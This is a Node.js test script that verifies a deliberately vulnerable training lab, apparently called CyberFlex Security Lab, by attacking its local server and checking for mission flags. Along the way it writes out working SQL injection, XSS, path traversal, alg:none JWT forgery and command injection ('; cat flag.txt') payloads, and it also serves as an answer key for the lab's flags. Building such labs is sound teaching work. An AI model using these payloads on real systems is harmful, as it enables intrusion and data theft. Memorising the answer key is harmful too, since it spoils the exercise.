const http = require('http');
const app = require('../server/server');
const db = require('../server/database/db');
const seedDatabase = require('../database/seed');

let server;
const TEST_PORT = 3456;
const BASE_URL = `http://127.0.0.1:${TEST_PORT}`;

function makeRequest(method, path, headers = {}, body = null) {
  return new Promise((resolve, reject) => {
    const url = new URL(path, BASE_URL);
    const options = {
      method,
      hostname: url.hostname,
      port: url.port,
      path: url.pathname + url.search,
      headers: { ...headers }
    };

    let postData = null;
    if (body) {
      if (typeof body === 'object') {
        postData = JSON.stringify(body);
        options.headers['Content-Type'] = 'application/json';
      } else {
        postData = body;
      }
      options.headers['Content-Length'] = Buffer.byteLength(postData);
    }

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        let json = null;
        try {
          json = JSON.parse(data);
        } catch (e) {}
        resolve({
          status: res.statusCode,
          headers: res.headers,
          data,
          json
        });
      });
    });

    req.on('error', (err) => reject(err));
    if (postData) req.write(postData);
    req.end();
  });
}

async function runVerification() {
  console.log('========================================================');
  console.log('CYBERFLEX SECURITY LAB — AUTOMATED MISSION VERIFICATION');
  console.log('========================================================\n');

  // Fresh seed
  seedDatabase();

  await new Promise((resolve) => {
    server = app.listen(TEST_PORT, () => {
      console.log(`Test server running on port ${TEST_PORT}\n`);
      resolve();
    });
  });

  let passed = 0;
  let failed = 0;

  function assert(condition, message) {
    if (condition) {
      console.log(`[PASS] ${message}`);
      passed++;
    } else {
      console.error(`[FAIL] ${message}`);
      failed++;
    }
  }

  try {
    // Mission 01: Reconnaissance
    const resM01 = await makeRequest('GET', '/robots.txt');
    const hasHeader01 = resM01.headers['x-cyberflex-recon'] === 'CFX{r3c0n_f1rst_st3p_d1sc0v3r}';
    const hasBody01 = resM01.data.includes('CFX{r3c0n_f1rst_st3p_d1sc0v3r}');
    assert(hasHeader01 || hasBody01, 'M01 Reconnaissance: Flag discovered in header or robots.txt');

    // Mission 02: Hidden Endpoint Discovery
    const resM02 = await makeRequest('GET', '/internal/system-status');
    assert(resM02.json && resM02.json.flag === 'CFX{h1dd3n_d00rs_unl0ck3d}', 'M02 Endpoint Discovery: Internal status exposes flag');

    // Mission 03: SQL Injection
    const sqliPayload = encodeURIComponent("' UNION SELECT id, secret_name, classification, secret_value, 'vault', 0 FROM secret_vault --");
    const resM03 = await makeRequest('GET', `/api/products/search?q=${sqliPayload}`);
    const foundVaultFlag = resM03.json && resM03.json.results && resM03.json.results.some(r => r.price === 'CFX{un10n_s3l3ct_m4st3r_sq11}' || r.name === 'FLAG_VAULT_KEY');
    assert(foundVaultFlag, 'M03 SQL Injection: UNION query dumped secret_vault flag');

    // Mission 04: Reflected XSS
    const xssPayload = encodeURIComponent('<script>alert("XSS")</script>');
    const resM04 = await makeRequest('GET', `/api/support/search?term=${xssPayload}`);
    assert(resM04.json && resM04.json.flag === 'CFX{r3fl3ct3d_scr1pt_3x3cut3d}', 'M04 Reflected XSS: Reflected script triggers flag');

    // Mission 05: Stored XSS
    const resM05 = await makeRequest('POST', '/api/comments', {}, {
      author: 'Attacker',
      content: '<img src=x onerror=fetch("/flag")>',
      rating: 5
    });
    assert(resM05.json && resM05.json.flag === 'CFX{st0r3d_xss_p3rs1st3nt_thr34t}', 'M05 Stored XSS: Unsanitized persistent comment parsed by moderator bot');

    // Mission 06: Authentication Weakness
    const resM06 = await makeRequest('POST', '/api/auth/login', {}, {
      username: 'admin',
      password: 'admin'
    });
    assert(resM06.json && resM06.json.flag === 'CFX{w34k_cr3ds_br0k3n_4uth}', 'M06 Auth Weakness: Default admin credentials accepted');
    const adminToken = resM06.json.token;

    // Mission 07: IDOR
    const resM07 = await makeRequest('GET', '/api/orders/3');
    assert(resM07.json && resM07.json.flag === 'CFX{1d0r_d1r3ct_0bj3ct_3xp0s3d}', 'M07 IDOR: Unauthorized order #3 accessed exposing flag');

    // Mission 08: Parameter Manipulation
    const resM08 = await makeRequest('POST', '/api/orders', {}, {
      productId: 4,
      customPrice: 1.00,
      quantity: 1
    });
    assert(resM08.json && resM08.json.flag === 'CFX{p4r4m_m4n1pul4t10n_succ3ss}', 'M08 Parameter Manipulation: Custom price accepted on hardware order');

    // Mission 09: Insecure File Upload
    const boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
    const multipartBody = `--${boundary}\r\nContent-Disposition: form-data; name="avatar"; filename="shell.html"\r\nContent-Type: text/html\r\n\r\n<h1>Exploit Payload</h1>\r\n--${boundary}--\r\n`;
    const resM09 = await makeRequest('POST', '/api/upload/avatar', {
      'Content-Type': `multipart/form-data; boundary=${boundary}`
    }, multipartBody);
    assert(resM09.json && resM09.json.flag === 'CFX{f1l3_upl04d_byp4ss_c0mpl3t3}', 'M09 File Upload: Dangerous HTML extension upload accepted');

    // Mission 10: Path Traversal
    const resM10 = await makeRequest('GET', '/api/documents/view?file=../../server/config/secret.key');
    assert(resM10.data.includes('CFX{d0t_d0t_sl4sh_tr4v3rs4l}'), 'M10 Path Traversal: Read server secret.key via dot-dot-slash');

    // Mission 11: API Enumeration
    const resM11 = await makeRequest('GET', '/api/v1/legacy/export-users');
    assert(resM11.json && resM11.json.flag === 'CFX{4p1_3num3r4t10n_l34k}', 'M11 API Enumeration: Discovered legacy v1 customer dump endpoint');

    // Mission 12: JWT Weakness (alg: none)
    const headerB64 = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64');
    const payloadB64 = Buffer.from(JSON.stringify({ id: 1, username: 'admin', role: 'admin' })).toString('base64');
    const algNoneToken = `${headerB64}.${payloadB64}.`;
    const resM12 = await makeRequest('GET', '/api/jwt/admin-report', {
      'Authorization': `Bearer ${algNoneToken}`
    });
    assert(resM12.json && resM12.json.flag === 'CFX{jwt_t0k3n_f0rg3ry_pwn}', 'M12 JWT Weakness: alg none token accepted for admin executive report');

    // Mission 13: CSRF
    const resM13 = await makeRequest('POST', '/api/user/update-email', {}, { email: 'hacked@attacker.local' });
    assert(resM13.json && resM13.json.flag === 'CFX{csrf_st4t3_ch4ng1ng_3xpl01t}', 'M13 CSRF: State-changing email update executed without anti-CSRF token');

    // Mission 14: Sandboxed Command Injection
    const resM14 = await makeRequest('POST', '/api/admin/diagnostics/ping', {}, { target: '127.0.0.1; cat flag.txt' });
    assert(resM14.json && resM14.json.output.includes('CFX{s4ndb0x_cm1_d14gn0st1cs_fl4g}'), 'M14 Command Injection: Sandboxed diagnostic runner parsed command chaining');

    // Mission 15: Chain Reaction (IDOR -> PIN -> Password Reset -> Vault)
    const resProfile = await makeRequest('GET', '/api/users/profile?id=1');
    const hasPin = resProfile.json && resProfile.json.profile.bio.includes('849201');
    assert(hasPin, 'M15 Chain Step 1: Admin profile IDOR leaked recovery PIN 849201');
    const resReset = await makeRequest('POST', '/api/auth/reset-password', {}, {
      username: 'admin',
      recoveryPin: '849201',
      newPassword: 'pwnedPassword2026'
    });
    assert(resReset.json && resReset.json.success, 'M15 Chain Step 2: Password reset via recovery PIN succeeded');
    const resVault = await makeRequest('GET', '/api/vault/audit-records', {
      'Cookie': `cfx_session=${adminToken}`
    });
    assert(resVault.json && resVault.json.flag === 'CFX{ch41n3d_3xpl01t_m4st3ry}', 'M15 Chain Step 3: Audit vault accessed with elevated admin session');

    // Mission 16: Mass Assignment & API Breach
    const resM16 = await makeRequest('POST', '/api/v2/users/update', {
      'Cookie': 'cfx_session=2'
    }, {
      role: 'admin',
      bio: 'Injected admin role via mass assignment'
    });
    assert(resM16.json && resM16.json.flag === 'CFX{m4ss_4ss1gnm3nt_4p1_br34ch}', 'M16 Mass Assignment: Unfiltered role property elevated privileges');

    // Mission 17: Broken Function Level Authorization
    const resM17 = await makeRequest('GET', '/api/admin/system-maintenance', {
      'Cookie': 'cfx_session=2' // Regular customer user #2
    });
    assert(resM17.json && resM17.json.flag === 'CFX{bfl4_4dm1n_funct10n_3xp0s3d}', 'M17 BFLA: Direct call to admin system-maintenance succeeded without role check');

    // Mission 18: Full Security Assessment
    const resM18 = await makeRequest('GET', '/api/support/tickets/99/attachments');
    assert(resM18.json && resM18.json.attachments && resM18.json.attachments[0].flag === 'CFX{full_sc0p3_p3nt3st_v3r1f13d}', 'M18 Full Assessment: Confidential executive ticket attachments retrieved');

    // Mission 19: Find the Unknown (Business logic overflow)
    const resM19 = await makeRequest('POST', '/api/orders', {}, {
      productId: 1,
      couponCode: 'OVERFLOW2026'
    });
    assert(resM19.json && resM19.json.flag === 'CFX{z3r0_d4y_l0g1c_fl4w_d1sc0v3r3d}', 'M19 Logic Flaw: Promotional coupon logic overflow rewarded flag');

    // Mission 20: Final Capstone Assessment
    const resM20 = await makeRequest('GET', '/recovery/master-backup', {
      'X-Cyberflex-Internal': 'true'
    });
    assert(resM20.json && resM20.json.flag === 'CFX{c4pst0n3_m4st3r_p3nt3st3r_c3rt}', 'M20 Capstone: Internal proxy header bypass granted master backup flag');

    // Mission 21: Defensive Mode & Patch Verification
    await makeRequest('POST', '/api/lab/defensive/toggle', {}, { missionId: '03', patchStatus: true });
    await makeRequest('POST', '/api/lab/defensive/toggle', {}, { missionId: '10', patchStatus: true });
    const resM21 = await makeRequest('POST', '/api/lab/defensive/verify');
    assert(resM21.json && resM21.json.flag === 'CFX{p4tch_v3r1f13d_s3cur3_c0d1ng}', 'M21 Defensive Mode: Security patches verified and awarded defensive flag');

    // Verify defensive patch blocks SQLi and Path Traversal
    const resPatched03 = await makeRequest('GET', `/api/products/search?q=${sqliPayload}`);
    assert(resPatched03.json.patched === true && resPatched03.json.results.length === 0, 'Defensive Check 1: SQL Injection neutralized by parameterized query');

    const resPatched10 = await makeRequest('GET', '/api/documents/view?file=../../server/config/secret.key');
    assert(resPatched10.status === 404, 'Defensive Check 2: Path Traversal neutralized by canonical path validation');

    // Lab Platform Tests: Hint Request & Flag Submission
    const hintRes = await makeRequest('POST', '/api/lab/missions/01/hint');
    assert(hintRes.json && hintRes.json.success && hintRes.json.hintLevel === 1, 'Lab Engine: Hint request unlocked Hint 1 and deducted points');

    const wrongFlagRes = await makeRequest('POST', '/api/lab/missions/01/flag', {}, { flag: 'CFX{wrong_flag}' });
    assert(wrongFlagRes.status === 400 && wrongFlagRes.json.isCorrect === false, 'Lab Engine: Invalid flag submission rejected');

    const correctFlagRes = await makeRequest('POST', '/api/lab/missions/01/flag', {}, { flag: 'CFX{r3c0n_f1rst_st3p_d1sc0v3r}' });
    assert(correctFlagRes.json && correctFlagRes.json.isCorrect === true, 'Lab Engine: Correct flag accepted, points awarded, status completed');

    const profileRes = await makeRequest('GET', '/api/lab/profile');
    assert(profileRes.json && profileRes.json.student.flagsCount >= 1, 'Lab Engine: Student profile tracking progress and flags');

  } catch (err) {
    console.error('Test error:', err);
    failed++;
  } finally {
    server.close();
    console.log('\n========================================================');
    console.log(`VERIFICATION SUMMARY: ${passed} PASSED, ${failed} FAILED`);
    console.log('========================================================');
    if (failed > 0) process.exit(1);
  }
}

if (require.main === module) {
  runVerification();
}

module.exports = runVerification;
